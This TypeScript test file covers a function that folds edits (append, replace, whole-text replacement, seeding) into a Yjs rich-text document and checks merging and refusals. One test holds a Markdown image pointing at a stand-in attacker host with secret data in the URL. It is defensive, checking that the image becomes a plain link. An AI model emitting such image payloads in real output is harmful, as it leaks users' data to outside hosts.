import { describe, expect, it } from 'bun:test'

import { MAX_DOCUMENT_CONTENT_LENGTH, MAX_DOCUMENT_UPDATE_LENGTH } from 'strategydance-core'
import { createRichTextYUpdate } from 'strategydance-design-system/lib/createRichTextYUpdate'
import { readRichTextYDoc } from 'strategydance-design-system/lib/readRichTextYDoc'
import { RICH_TEXT_YJS_FRAGMENT, type RichTextBlock } from 'strategydance-design-system/lib/richText'
import * as Y from 'yjs'

import type { KnowledgeDocumentUpdate } from '~types'

import foldKnowledgeDocumentEdit from '~domain/knowledge/foldKnowledgeDocumentEdit'
import readKnowledgeDocumentText from '~domain/knowledge/readKnowledgeDocumentText'

function paragraph(text: string): RichTextBlock {
  return { type: 'paragraph', content: [{ type: 'text', text }] }
}

function encode(bytes: Uint8Array) {
  return Buffer.from(bytes).toString('base64')
}

function createState(blocks: RichTextBlock[]) {
  return encode(createRichTextYUpdate(JSON.stringify(blocks)))
}

// A tab's copy of the document, as it opened it from its snapshot
function open(state: string, updates: KnowledgeDocumentUpdate[] = []) {
  const doc = new Y.Doc()

  Y.applyUpdate(doc, Buffer.from(state, 'base64'))
  updates.forEach(({ payload }) => Y.applyUpdate(doc, Buffer.from(payload, 'base64')))

  return doc
}

// What a tab pushes when it types into a top-level block: its edit as a pending update
function typeInto(doc: Y.Doc, index: number, offset: number, text: string) {
  const before = Y.encodeStateVector(doc)
  const container = (doc.getXmlFragment(RICH_TEXT_YJS_FRAGMENT).get(0) as Y.XmlElement).get(index) as Y.XmlElement

  ;((container.get(0) as Y.XmlElement).get(0) as Y.XmlText).insert(offset, text)

  return encode(Y.encodeStateAsUpdate(doc, before))
}

function read(doc: Y.Doc): RichTextBlock[] {
  return JSON.parse(readRichTextYDoc(doc).value)
}

function readIds(state: string) {
  const result = readKnowledgeDocumentText({ state, updates: [] })

  return result.outcome === 'read' ? result.blocks.map(block => block.id) : []
}

function fold(...args: Parameters<typeof foldKnowledgeDocumentEdit>) {
  const result = foldKnowledgeDocumentEdit(...args)

  if (result.outcome !== 'folded') throw new Error(`The fold was refused: ${result.outcome}`)

  return result
}

describe('foldKnowledgeDocumentEdit', () => {
  it('writes the edited text, which reads back as the blocks the edit made', () => {
    const state = createState([paragraph('Alpha')])
    const folded = fold(
      { state, updates: [], content: '' },
      { type: 'append', markdown: '## Decisions\n\n- Ship **on Friday**\n- [ ] Tell <u>everyone</u>' },
    )
    const expected: RichTextBlock[] = [
      paragraph('Alpha'),
      { type: 'heading', content: [{ type: 'text', text: 'Decisions' }] },
      {
        type: 'bulletListItem',
        content: [
          { type: 'text', text: 'Ship ' },
          { type: 'text', text: 'on Friday', styles: { bold: true } },
        ],
      },
      {
        type: 'checkListItem',
        content: [
          { type: 'text', text: 'Tell ' },
          { type: 'text', text: 'everyone', styles: { underline: true } },
        ],
      },
    ]

    expect(read(open(folded.state))).toEqual(expected)
    expect(JSON.parse(folded.content)).toEqual(expected)
    expect(folded.contentText).toBe('Alpha\nDecisions\nShip on Friday\nTell everyone')
    expect(folded.isSeed).toBe(false)
  })

  it('merges the updates pending, and names exactly those it merged, one it could not read included', () => {
    const state = createState([paragraph('Alpha'), paragraph('Bravo')])
    const updates = [
      { id: 'typed', payload: typeInto(open(state), 1, 5, ' and more') },
      { id: 'broken', payload: encode(new Uint8Array([255, 255, 255, 255])) },
    ]
    const folded = fold({ state, updates, content: '' }, { type: 'replaceText', find: 'Alpha', replace: 'Omega' })

    expect(read(open(folded.state))).toEqual([paragraph('Omega'), paragraph('Bravo and more')])
    expect(folded.updateIds).toEqual(['typed', 'broken'])
  })

  it('merges with what a tab typed meanwhile, both ways, keeping both', () => {
    const state = createState([paragraph('Alpha'), paragraph('Bravo'), paragraph('Charlie')])
    const [, bravo] = readIds(state)
    const tab = open(state)
    const typed = typeInto(tab, 0, 5, ' typed in the tab')
    const folded = fold(
      { state, updates: [], content: '' },
      { type: 'replaceBlocks', fromId: bravo, toId: bravo, markdown: 'Written by the agent' },
    )
    const expected = [paragraph('Alpha typed in the tab'), paragraph('Written by the agent'), paragraph('Charlie')]

    // The tab reads the new snapshot as the revision moves, and its push lands after the fold
    Y.applyUpdate(tab, Buffer.from(folded.state, 'base64'))
    expect(read(tab)).toEqual(expected)
    expect(read(open(folded.state, [{ id: 'typed', payload: typed }]))).toEqual(expected)
  })

  it('keeps the ids of the blocks an edit leaves alone', () => {
    const state = createState([paragraph('Alpha'), paragraph('Bravo')])
    const [alpha, bravo] = readIds(state)
    const folded = fold(
      { state, updates: [], content: '' },
      { type: 'replaceBlocks', fromId: bravo, toId: bravo, markdown: 'Charlie\n\nDelta' },
    )
    const ids = readIds(folded.state)

    expect(ids[0]).toBe(alpha)
    expect(ids).toHaveLength(3)
    expect(ids).not.toContain(bravo)
  })

  it('folds an edit too long to push as an update whole', () => {
    const state = createState([paragraph('Alpha')])
    const markdown = Array.from({ length: 400 }, (_, index) => `Paragraph ${index}: ${'word '.repeat(30)}`).join('\n\n')
    const folded = fold({ state, updates: [], content: '' }, { type: 'append', markdown })
    const before = open(state)
    const edit = encode(Y.encodeStateAsUpdate(open(folded.state), Y.encodeStateVector(before)))

    expect(edit.length).toBeGreaterThan(MAX_DOCUMENT_UPDATE_LENGTH)
    expect(read(open(folded.state))).toHaveLength(401)
  })

  it('replaces the whole text', () => {
    const state = createState([paragraph('Alpha'), paragraph('Bravo')])
    const folded = fold({ state, updates: [], content: '' }, { type: 'content', markdown: '# New\n\nText' })

    expect(read(open(folded.state))).toEqual([
      { type: 'heading', props: { level: 1 }, content: [{ type: 'text', text: 'New' }] },
      paragraph('Text'),
    ])
  })

  it('seeds a document with no snapshot from its content, in the same write', () => {
    const content = JSON.stringify([paragraph('Stored before the editor was shared')])
    const folded = fold({ state: null, updates: [], content }, { type: 'append', markdown: 'Added by the agent' })

    expect(folded.isSeed).toBe(true)
    expect(read(open(folded.state))).toEqual([
      paragraph('Stored before the editor was shared'),
      paragraph('Added by the agent'),
    ])
  })

  it('writes no picture, however the Markdown asks for one', () => {
    const state = createState([paragraph('Alpha')])
    const folded = fold(
      { state, updates: [], content: '' },
      { type: 'append', markdown: '![Exfiltrate](https://attacker.example/?d=secret)' },
    )

    expect(read(open(folded.state))).toEqual([
      paragraph('Alpha'),
      {
        type: 'paragraph',
        content: [
          {
            type: 'link',
            href: 'https://attacker.example/?d=secret',
            content: [{ type: 'text', text: 'Exfiltrate' }],
          },
        ],
      },
    ])
  })

  describe('refuses, writing nothing', () => {
    it('an edit that takes the text past the length of a document', () => {
      const state = createState([paragraph('a'.repeat(MAX_DOCUMENT_CONTENT_LENGTH - 100))])

      expect(
        foldKnowledgeDocumentEdit({ state, updates: [], content: '' }, { type: 'append', markdown: 'b'.repeat(200) }),
      ).toEqual({ outcome: 'contentTooLong' })
    })

    it('a range whose block is gone', () => {
      const state = createState([paragraph('Alpha')])
      const [alpha] = readIds(state)

      expect(
        foldKnowledgeDocumentEdit(
          { state, updates: [], content: '' },
          { type: 'replaceBlocks', fromId: alpha, toId: 'gone', markdown: 'Bravo' },
        ),
      ).toEqual({ outcome: 'blockNotFound', id: 'gone' })
    })

    it('a piece of text that occurs twice', () => {
      const state = createState([paragraph('Alpha'), paragraph('Alpha')])

      expect(
        foldKnowledgeDocumentEdit(
          { state, updates: [], content: '' },
          { type: 'replaceText', find: 'Alpha', replace: 'Omega' },
        ),
      ).toEqual({ outcome: 'textNotUnique', count: 2 })
    })

    it('a snapshot that cannot be merged', () => {
      expect(
        foldKnowledgeDocumentEdit(
          { state: encode(new Uint8Array([255, 255, 255, 255])), updates: [], content: '' },
          { type: 'append', markdown: 'Bravo' },
        ),
      ).toEqual({ outcome: 'unreadableState' })
    })

    it('a text holding what this editor cannot read', () => {
      const doc = open(createState([paragraph('Alpha')]))
      const container = (doc.getXmlFragment(RICH_TEXT_YJS_FRAGMENT).get(0) as Y.XmlElement).get(0) as Y.XmlElement

      ;(container.get(0) as Y.XmlElement).setAttribute('textAlignment', 'center')

      for (const edit of [
        { type: 'content', markdown: 'Bravo' },
        { type: 'append', markdown: 'Bravo' },
      ] as const) {
        expect(
          foldKnowledgeDocumentEdit({ state: encode(Y.encodeStateAsUpdate(doc)), updates: [], content: '' }, edit),
        ).toEqual({ outcome: 'unknownContent' })
      }
    })
  })
})
